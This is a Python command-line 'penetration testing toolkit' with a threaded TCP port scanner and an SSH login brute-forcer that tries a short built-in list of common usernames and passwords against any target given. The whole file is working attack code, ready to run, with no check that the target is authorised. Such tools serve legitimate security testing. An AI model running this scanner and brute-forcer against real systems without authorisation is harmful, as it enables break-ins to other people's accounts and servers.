import socket
import threading
import queue
import time
import paramiko
from typing import List, Dict
import argparse


class PenTestToolkit:
    def __init__(self):
        self.open_ports = []
        self.timeout = 1


class PortScanner(PenTestToolkit):
    def __init__(self, target: str, port_range: tuple = (1, 1024)):
        super().__init__()
        self.target = target
        self.start_port, self.end_port = port_range
        self.q = queue.Queue()

    def port_scan(self, port: int) -> None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                self.open_ports.append(port)
            sock.close()
        except Exception as e:
            print(f"Error scanning port {port}: {e}")

    def worker(self) -> None:
        while True:
            try:
                port = self.q.get_nowait()
                self.port_scan(port)
                self.q.task_done()
            except queue.Empty:
                break

    def scan(self, threads: int = 50) -> List[int]:
        print(f"Scanning {self.target}...")
        start_time = time.time()

        for port in range(self.start_port, self.end_port + 1):
            self.q.put(port)

        thread_list = []
        for _ in range(min(threads, self.end_port - self.start_port + 1)):
            t = threading.Thread(target=self.worker)
            t.start()
            thread_list.append(t)

        for t in thread_list:
            t.join()

        execution_time = time.time() - start_time
        print(f"Scan completed in {execution_time:.2f} seconds")
        return sorted(self.open_ports)


class SSHBruteForcer(PenTestToolkit):
    def __init__(self, target: str, port: int = 22):
        super().__init__()
        self.target = target
        self.port = port
        self.found = False
        self.result = {}

    def try_login(self, username: str, password: str) -> bool:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.target,
                        port=self.port,
                        username=username,
                        password=password,
                        timeout=self.timeout)
            self.found = True
            self.result = {"username": username, "password": password}
            ssh.close()
            return True
        except Exception:
            return False
        finally:
            ssh.close()

    def brute_force(self, usernames: List[str], passwords: List[str]) -> Dict:
        print(f"Starting brute force on {self.target}:{self.port}")
        start_time = time.time()

        for username in usernames:
            if self.found:
                break
            for password in passwords:
                if self.found:
                    break
                print(f"Trying {username}:{password}")
                if self.try_login(username, password):
                    break

        execution_time = time.time() - start_time
        print(f"Brute force completed in {execution_time:.2f} seconds")
        return self.result


def main():
    parser = argparse.ArgumentParser(description="Penetration Testing Toolkit")
    parser.add_argument("module", choices=["portscan", "sshbrute"], help="Module to run")
    parser.add_argument("--target", required=True, help="Target IP/hostname")
    args = parser.parse_args()

    if args.module == "portscan":
        scanner = PortScanner(args.target)
        open_ports = scanner.scan()
        print(f"Open ports: {open_ports}")

    elif args.module == "sshbrute":
        usernames = ["admin", "root", "user"]
        passwords = ["password", "123456", "admin"]
        bruteforcer = SSHBruteForcer(args.target)
        result = bruteforcer.brute_force(usernames, passwords)
        if result:
            print(f"Credentials found: {result}")
        else:
            print("No credentials found")


if __name__ == "__main__":
    main()